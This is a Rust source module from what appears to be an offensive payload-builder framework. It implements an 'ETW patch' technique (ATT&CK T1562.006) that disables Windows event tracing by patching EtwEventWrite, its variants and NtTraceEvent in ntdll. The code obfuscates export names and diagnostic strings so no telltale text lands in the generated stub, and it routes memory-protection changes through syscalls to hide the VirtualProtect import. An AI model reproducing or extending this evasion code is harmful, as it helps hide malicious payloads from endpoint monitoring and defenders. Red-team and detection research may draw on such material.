//! ETW patch.
//!
//! Patches `EtwEventWrite` (and, optionally, `EtwEventWriteFull`,
//! `EtwEventWriteEx` and `NtTraceEvent`) in the current process so ETW providers
//! stop emitting events. A Preparation technique: it modifies the process state
//! and never runs the payload. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for the ETW patch.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Also patch `EtwEventWriteFull`, the variant that most script and .NET
    /// telemetry actually calls. Best effort: if the export cannot be patched,
    /// the main patch still stands.
    #[serde(default = "default_true")]
    pub full: bool,

    /// Also patch `EtwEventWriteEx`, the extended write variant. Best effort,
    /// like [`Params::full`].
    #[serde(default = "default_true")]
    pub ex: bool,

    /// Also patch `NtTraceEvent`, the native export the user-mode event writers
    /// hand their events to on the way into the kernel. Best effort, and the
    /// widest single cut: it also catches providers that bypass the `Etw*`
    /// wrappers.
    #[serde(default = "default_true")]
    pub nt_trace: bool,
}

/// Default for the optional patch flags: cover every variant.
///
/// Each patch is best effort, so on-by-default costs nothing when a build does
/// not export the variant.
pub fn default_true() -> bool {
    true
}

impl Default for Params {
    /// Defaults to patching every variant (see [`default_true`]).
    fn default() -> Self {
        Self {
            full: default_true(),
            ex: default_true(),
            nt_trace: default_true(),
        }
    }
}

/// Static metadata for the ETW patch.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "patch_etw",
    attck: &["T1562.006"],
    stability: Stability::Stable,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Preparation,
    doc_path: "src/techniques/patch_etw/README.md",
    readme: include_str!("README.md"),
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[],
    requires_indirect_syscalls: false,
    params_example: "technique: patch_etw\nparams:\n  full: true\n  ex: true\n  nt_trace: true\n",
    // The page protection changes go through the syscall layer, so
    // `mode: indirect` removes the `VirtualProtect` import.
    syscalls: &["NtProtectVirtualMemory"],
    resolves_imports: false,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text — and no technique keyword like
/// `loader` — lands in the generated stub's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_LOAD_FAILED$", "failed to load the library to patch"),
    (
        "$MSG_RESOLVE_FAILED$",
        "failed to resolve the function to patch",
    ),
    (
        "$MSG_MAKE_WRITABLE_FAILED$",
        "failed to make the target function writable",
    ),
    (
        "$MSG_RESTORE_PROTECTION_FAILED$",
        "failed to restore the target function protection",
    ),
];

impl Params {
    /// Renders the ETW-patch stub fragment, obfuscating the `ntdll.dll` and
    /// every event-writing export name through `strings` so they are rebuilt at
    /// runtime, and baking in which optional variants are patched too.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let etw_dll = strings.obfuscate("ntdll.dll").render_stub_expr("etw_dll");
        let etw_func = strings
            .obfuscate("EtwEventWrite")
            .render_stub_expr("etw_func");
        let etw_full_func = strings
            .obfuscate("EtwEventWriteFull")
            .render_stub_expr("etw_full_func");
        let etw_ex_func = strings
            .obfuscate("EtwEventWriteEx")
            .render_stub_expr("etw_ex_func");
        let etw_nt_trace_func = strings
            .obfuscate("NtTraceEvent")
            .render_stub_expr("etw_nt_trace_func");

        let mut rendered = DEF.stub_fragment.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("etw_msg_{index}")),
            );
        }
        rendered
            .replace("$ETW_DLL_DEF$", &etw_dll)
            .replace("$ETW_FUNC_DEF$", &etw_func)
            .replace("$ETW_FULL_FUNC_DEF$", &etw_full_func)
            .replace("$ETW_EX_FUNC_DEF$", &etw_ex_func)
            .replace("$ETW_NT_TRACE_FUNC_DEF$", &etw_nt_trace_func)
            .replace("$PATCH_FULL$", if self.full { "true" } else { "false" })
            .replace("$PATCH_EX$", if self.ex { "true" } else { "false" })
            .replace(
                "$PATCH_NT_TRACE$",
                if self.nt_trace { "true" } else { "false" },
            )
    }
}

#[cfg(test)]
mod tests;
